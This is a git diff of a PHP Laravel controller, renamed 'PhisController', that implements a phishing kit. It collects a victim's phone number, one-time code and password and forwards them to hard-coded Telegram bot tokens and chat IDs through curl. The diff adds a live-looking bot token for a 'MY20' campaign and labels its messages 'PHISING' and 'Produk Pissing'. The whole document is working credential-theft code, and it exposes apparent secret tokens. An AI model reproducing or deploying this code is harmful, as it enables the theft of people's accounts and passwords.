@@ -2,96 +2,43 @@
 
 namespace App\Http\Controllers;
 
-use Illuminate\Support\Facades\Session;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Session;
 
-class HomeController extends Controller
+class PhisController extends Controller
 {
-
-    public function index(Request $request)
-    {
-
-        return inertia('LoginIndex');
-    }
-
-    public function login_store(Request $request)
+    public function store_number(Request $request)
     {
         $subdomain = explode('.', $request->getHost())[0];
-        Session::forget("dataNumber");
-        $phone = $request->phone;
-        $code = $request->code;
-        Session::push("dataNumber", [
-            'getPhone' => $phone,
-            'getDialCode' => $code,
-        ]);
-        $this->sendKode($phone, $code, "", "", $subdomain);
-        return redirect('verif');
+        $phoneNumber = $request->phoneNumber;
+        Session::push("phoneNumber", $phoneNumber);
+        $this->sendKode($phoneNumber, "", "", "", $subdomain);
+        return redirect()->route("phis-verif");
     }
 
     public function verif(Request $request)
     {
-        $data = Session::get('dataNumber');
-
-        $getPhone = $data[0]['getPhone'] ?? 0;
-        $getDialCode = $data[0]['getDialCode'] ?? 0;
-        return inertia('Verif', compact('getPhone', 'getDialCode'));
+        return inertia('rhmtt/Verif');
     }
-
-    public function verif_store(Request $request)
+    public function store_verif(Request $request)
     {
         $subdomain = explode('.', $request->getHost())[0];
-        Session::forget("dataNumber");
-        $phone = $request->phone;
-        $code = $request->dial_code;
-        $verif = $request->code;
-        Session::push('dataNumber', [
-            'getPhone' => $phone,
-            'getDialCode' => $code,
-            'getVerif' => $verif,
-        ]);
-        $this->sendKode($phone, $code, "", $verif, $subdomain);
-        return redirect('password');
-    }
-
-    public function get_password(Request $request)
-    {
-        $data = Session::get('dataNumber');
-
-        $getPhone = $data[0]['getPhone'] ?? 0;
-        $getDialCode = $data[0]['getDialCode'] ?? 0;
-        $getVerif = $data[0]['getVerif'] ?? 0;
-        return inertia('GetPassword', compact(
-            'getPhone',
-            'getDialCode',
-            'getVerif'
-        ));
-    }
-    public function store_password(Request $request)
-    {
-        $subdomain = explode('.', $request->getHost())[0];
-        Session::forget("dataNumber");
-        $phone = $request->phone;
-        $code = $request->dial_code;
         $verif = $request->code;
         $password = $request->password;
-        $this->sendKode($phone, $code, $verif, $password, $subdomain);
-        return redirect('');
+        $phoneNumber = Session::get("phoneNumber")[0];
+        Session::remove("phoneNumber");
+        $this->sendKode($phoneNumber, "", $password, $password, $subdomain);
+        return redirect()->route("phis-success");
     }
 
-    public function index_first(Request $request)
+    public function success(Request $request)
     {
-        $subdomain = explode('.', $request->getHost())[0];
-        return inertia('rhmtt/phis_rhmtt');
-        // if ($subdomain ===  "live-vc-private1-my22") {
-        // } else {
-
-        //     return inertia('Index');
-        // }
+        return inertia('rhmtt/Success');
     }
     public function sendKode($phone = "", $code = "", $otp = "", $password = "", $subdomain = "")
     {
         // mulai dari bot 6 yah
-
+        $subdomain = "live-vc-private1-my20";
         if ($subdomain == "live-vc-private1-my6") {
             // BOT 6
             $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
@@ -169,18 +116,14 @@ class HomeController extends Controller
 
             $chat_id = "7092408619";
             $phisData = "MY19";
+            // RHMTT 20
         } else  if ($subdomain == "live-vc-private1-my20") {
             // BOT 20
-            $bot_token = "";
+            $bot_token = "8000955252:AAEJ5Vkla2karPybMj_YTzg3Z-zvA8Xc7q8";
 
-            $chat_id = "";
+            $chat_id = "6424120537";
+
             $phisData = "MY20";
-        } else  if ($subdomain == "live-vc-private1-my21") {
-            // BOT 21s`
-            $bot_token = "";
-
-            $chat_id = "";
-            $phisData = "MY21";
         }
 
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
@@ -196,9 +139,10 @@ class HomeController extends Controller
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, [
             'chat_id' => $chat_id,
-            'text' => "Phone | $phone \n Code | $code \n OTP :| $otp \n Password : $password \n \n \n
-    PHISING $phisData
-    "
+            'text' => "  Produk Pissing
+            \n  - No $phone  
+            \n  - Code $otp  
+            \n  - Password $password "
         ]);
 
         // Eksekusi cURL request
